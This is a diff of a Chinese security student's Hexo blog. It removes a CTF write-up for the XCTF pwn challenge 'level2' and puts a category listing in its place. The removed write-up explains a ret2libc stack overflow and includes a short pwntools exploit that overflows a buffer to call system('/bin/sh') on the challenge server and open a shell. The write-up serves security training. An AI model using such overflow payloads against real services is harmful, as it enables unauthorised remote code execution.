@@ -22,33 +22,26 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"lmarch2.github.com","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）">
-<meta property="og:type" content="article">
-<meta property="og:title" content="week3 T5">
-<meta property="og:url" content="http://lmarch2.github.com/posts/fe55b1cb/index.html">
+    <meta name="description" content="A Student studying Cybersecurity">
+<meta property="og:type" content="website">
+<meta property="og:title" content="lmarch2&#39;blog">
+<meta property="og:url" content="http://lmarch2.github.com/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/index.html">
 <meta property="og:site_name" content="lmarch2&#39;blog">
-<meta property="og:description" content="T5 level2 2023-01-15WP攻防世界pwn题考点：ret2libc1（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）">
+<meta property="og:description" content="A Student studying Cybersecurity">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp">
-<meta property="og:image" content="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp">
-<meta property="article:published_time" content="2023-01-15T14:43:00.000Z">
-<meta property="article:modified_time" content="2023-01-22T10:33:20.347Z">
 <meta property="article:author" content="lmarch2">
 <meta property="article:tag" content="ctf">
-<meta property="article:tag" content="攻防世界">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp">
 
 
-<link rel="canonical" href="http://lmarch2.github.com/posts/fe55b1cb/">
+<link rel="canonical" href="http://lmarch2.github.com/categories/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lmarch2.github.com/posts/fe55b1cb/","path":"posts/fe55b1cb/","title":"week3 T5"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"categories/实用工具/index.html","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>week3 T5 | lmarch2'blog</title>
+<title>分类: 实用工具 | lmarch2'blog</title>
   
 
 
@@ -135,7 +128,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -148,7 +141,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T5-level2"><span class="nav-text">T5 level2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -275,293 +267,50 @@
 
     </div>
 
-    <div class="main-inner post posts-expand">
+    <div class="main-inner category posts-collapse">
 
 
   
-
-
-<div class="post-block">
   
   
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://lmarch2.github.com/posts/fe55b1cb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/lmarch2/images/blob/main/typora/202307282109602.jpg?raw=true">
-      <meta itemprop="name" content="lmarch2">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lmarch2'blog">
-      <meta itemprop="description" content="A Student studying Cybersecurity">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="week3 T5 | lmarch2'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          week3 T5
+  <div class="post-block">
+    <div class="post-content">
+      <div class="collection-title">
+        <h1 class="collection-header">实用工具
+          <small>分类</small>
         </h1>
+      </div>
 
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-01-15 22:43:00" itemprop="dateCreated datePublished" datetime="2023-01-15T22:43:00+08:00">2023-01-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-01-22 18:33:20" itemprop="dateModified" datetime="2023-01-22T18:33:20+08:00">2023-01-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>677</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-        <h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote>
-<p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img data-src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串&#x2F;bin&#x2F;sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img data-src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p>
-<p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将&#x2F;bin&#x2F;sh作为参数传递其地址即可</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; 61.147.171.105 &#x27;</span>, <span class="number">60218</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x08048320</span>)+<span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b&#x27;bbbb&#x27;是填充无效system返回地址， </span></span><br><span class="line"><span class="comment">#p32(0x0804A024)是/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+      
+    <div class="collection-year">
+      <span class="collection-header">2023</span>
     </div>
 
-    
-    
-    
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+      <div class="post-meta-container">
+        <time itemprop="dateCreated"
+              datetime="2023-08-28T21:54:45+08:00"
+              content="2023-08-28">
+          08-28
+        </time>
+      </div>
 
-<div> 
-	 
-		<div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------文章就到这里啦！<i class="fa fa-paw"></i>感谢您的阅读XD-------------</div>
-    
-</div> 
-	 
-</div>
+      <div class="post-title">
+          <a class="post-title-link" href="/posts/6121198a/" itemprop="url">
+            <span itemprop="name">PWN一些用到的指令和工具</span>
+          </a>
+      </div>
 
-    <footer class="post-footer">
-          
-
-<div class="post-copyright">
-<ul>
-  <li class="post-copyright-author">
-      <strong>本文作者： </strong>lmarch2
-  </li>
-  <li class="post-copyright-link">
-      <strong>本文链接：</strong>
-      <a href="http://lmarch2.github.com/posts/fe55b1cb/" title="week3 T5">http://lmarch2.github.com/posts/fe55b1cb/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-          <div class="post-tags">
-
- <div class="post-tags">
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"><i class="fa fa-tag"></i> 攻防世界</a>
-          </div>
-          <script type="text/javascript">
-            var tagsall=document.getElementsByClassName("post-tags")
-            for (var i = tagsall.length - 1; i >= 0; i--){
-                var tags=tagsall[i].getElementsByTagName("a");
-                for (var j = tags.length - 1; j >= 0; j--) {
-                    var golden_ratio = 0.618033988749895;
-                    var s = 0.5;
-                    var v = 0.999;
-                    var h = golden_ratio + Math.random()*0.8 - 0.5;
-                    var h_i = parseInt(h * 6);
-                    var f = h * 6 - h_i;
-                    var p = v * (1 - s);
-                    var q = v * (1 - f * s);
-                    var t = v * (1 - (1 - f) * s);
-                    var r, g, b;
-                    switch (h_i) {
-                        case 0:
-                            r = v;
-                            g = t;
-                            b = p;
-                            break;
-                        case 1:
-                            r = q;
-                            g = v;
-                            b = p;
-                            break;
-                        case 2:
-                            r = p;
-                            g = v;
-                            b = t;
-                            break;
-                        case 3 :
-                            r = p;
-                            g = q;
-                            b = v;
-                            break;
-                        case 4:
-                            r = t;
-                            g = p;
-                            b = v;
-                            break;
-                        case 5:
-                            r = v;
-                            g = p;
-                            b = q;
-                            break;
-                        default:
-                            r = 1;
-                            g = 1;
-                            b = 1;
-                      }
-                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
-                }
-            }                        
-            </script>
-
-
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-
- <div class="post-tags">
-              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
-              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"><i class="fa fa-tag"></i> 攻防世界</a>
-          </div>
-          <script type="text/javascript">
-            var tagsall=document.getElementsByClassName("post-tags")
-            for (var i = tagsall.length - 1; i >= 0; i--){
-                var tags=tagsall[i].getElementsByTagName("a");
-                for (var j = tags.length - 1; j >= 0; j--) {
-                    var golden_ratio = 0.618033988749895;
-                    var s = 0.5;
-                    var v = 0.999;
-                    var h = golden_ratio + Math.random()*0.8 - 0.5;
-                    var h_i = parseInt(h * 6);
-                    var f = h * 6 - h_i;
-                    var p = v * (1 - s);
-                    var q = v * (1 - f * s);
-                    var t = v * (1 - (1 - f) * s);
-                    var r, g, b;
-                    switch (h_i) {
-                        case 0:
-                            r = v;
-                            g = t;
-                            b = p;
-                            break;
-                        case 1:
-                            r = q;
-                            g = v;
-                            b = p;
-                            break;
-                        case 2:
-                            r = p;
-                            g = v;
-                            b = t;
-                            break;
-                        case 3 :
-                            r = p;
-                            g = q;
-                            b = v;
-                            break;
-                        case 4:
-                            r = t;
-                            g = p;
-                            b = v;
-                            break;
-                        case 5:
-                            r = v;
-                            g = p;
-                            b = q;
-                            break;
-                        default:
-                            r = 1;
-                            g = 1;
-                            b = 1;
-                      }
-                    tags[j].style.background = "rgba("+parseInt(r*255)+","+parseInt(g*255)+","+parseInt(b*255)+","+0.5+")";
-                }
-            }                        
-            </script>
-
-
-              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"><i class="fa fa-tag"></i> 攻防世界</a>
-          </div>
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/posts/8952815d/" rel="prev" title="week3 T4">
-                  <i class="fa fa-chevron-left"></i> week3 T4
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/posts/64ef4d6b/" rel="next" title="week4 T1">
-                  week4 T1 <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
+      
+    </header>
   </article>
-</div>
 
-
-
-
-
+    </div>
+  </div>
+  
+  
+  
 
 </div>
   </main>
